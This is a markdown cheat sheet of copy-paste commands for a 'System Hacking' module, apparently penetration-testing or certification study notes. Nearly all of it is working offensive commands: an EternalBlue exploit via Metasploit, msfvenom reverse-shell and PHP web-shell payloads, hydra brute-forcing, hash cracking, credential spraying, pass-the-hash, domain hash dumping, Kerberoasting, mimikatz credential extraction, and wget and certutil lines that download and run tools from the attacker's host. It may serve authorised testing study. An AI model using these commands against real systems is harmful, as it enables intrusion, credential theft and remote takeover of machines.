# 05 System Hacking — copy-paste commands

> Replace `<IP>` with the target. `<LHOST>` is your attacker IP. `<U>` / `<P>` are creds.

## Metasploit — the flow

```bash
msfconsole -q
search <cve-or-keyword>          # e.g. search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <IP>
set LHOST <LHOST>
set LPORT 4444
run
```

→ See [metasploit.md](../tools/metasploit.md)

## msfvenom — payloads

```bash
# Windows reverse shell exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe

# Linux reverse shell elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.php

# Staged vs stageless: drop the '/' for stageless (windows/x64/shell_reverse_tcp)
```

## multi/handler — catch the shell

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT 4444; run"
```

## Online brute force — hydra

```bash
# SSH
hydra -l <U> -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# FTP
hydra -L users.txt -P rockyou.txt ftp://<IP>

# HTTP form POST (read the form field names first!)
hydra -l admin -P rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# RDP
hydra -l <U> -P rockyou.txt rdp://<IP>
```

## Offline cracking — john

```bash
# Auto-detect hash type
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Specify format
john --format=NT --wordlist=rockyou.txt hash.txt

# Show cracked
john --show hash.txt

# /etc/shadow style — unshadow first
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt
```

## Offline cracking — hashcat (memorize these modes)

```bash
# NTLM
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# NetNTLMv2 (Responder captures)
hashcat -m 5600 -a 0 hash.txt rockyou.txt

# Linux sha512crypt ($6$)
hashcat -m 1800 -a 0 hash.txt rockyou.txt

# MD5
hashcat -m 0 -a 0 hash.txt rockyou.txt

# Show cracked
hashcat -m 1000 hash.txt --show
```

## crackmapexec — SMB everything

```bash
# Spray creds
crackmapexec smb <RANGE> -u <U> -p <P>

# Pass-the-hash
crackmapexec smb <IP> -u <U> -H <NTHASH>

# Dump SAM
crackmapexec smb <IP> -u <U> -p <P> --sam

# Enum shares
crackmapexec smb <IP> -u <U> -p <P> --shares
```

## impacket — the good stuff

```bash
# Shell as user (cleartext)
impacket-psexec <U>:<P>@<IP>
impacket-wmiexec <U>:<P>@<IP>
impacket-smbexec <U>:<P>@<IP>

# Pass-the-hash
impacket-psexec -hashes :<NTHASH> <U>@<IP>

# Dump all domain hashes
impacket-secretsdump <U>:<P>@<IP>

# Kerberos: AS-REP roast, Kerberoast
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass
impacket-GetUserSPNs <DOMAIN>/<U>:<P> -request
```

## evil-winrm — interactive Windows shell

```bash
evil-winrm -i <IP> -u <U> -p <P>
evil-winrm -i <IP> -u <U> -H <NTHASH>      # pass-the-hash
```

## mimikatz (run on target Windows box)

```
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
token::elevate
```

## Privesc enumeration

```bash
# Linux — host linpeas, then on target:
wget http://<LHOST>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# Quick manual checks
sudo -l
find / -perm -4000 -type f 2>/dev/null       # SUID
uname -a                                      # kernel exploit hunt

# Windows — winpeas
certutil -urlcache -f http://<LHOST>/winPEASx64.exe winpeas.exe
winpeas.exe
```
